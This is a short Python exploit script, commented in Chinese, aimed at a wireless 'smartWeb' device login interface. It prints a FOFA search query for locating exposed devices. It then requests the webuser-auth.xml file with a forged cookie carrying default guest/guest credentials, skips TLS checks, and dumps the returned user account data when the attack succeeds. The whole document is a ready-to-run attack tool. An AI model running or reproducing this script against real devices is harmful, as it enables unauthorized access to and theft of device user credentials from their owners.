#!/usr/bin/env python
# -*- conding:utf-8 -*-

import requests
import argparse
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('fofa:title="无线smartWeb--登录页面"')

def run_proto(url):
    url = url + "/web/xml/webuser-auth.xml"
    # 请求头添加默认密码：guest/guest 信息。
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        "Cookie": "login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302;auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest"
            }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        res = requests.get(url=url, headers=headers, verify=False, timeout=3)
        if res.status_code == 200 and 'user' in res.text and 'CDATA' in res.text:
            print(f"目标系统: {url} 存在逻辑缺陷问题！")
            print(f"[-]  响应为：{res.text}")
            return True
        else:
            print(f"目标系统: {url} 不存在逻辑缺陷问题！")
            return False
    except Exception as e:
        return False

def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(
            proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1

if __name__ == "__main__":
    title()
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')
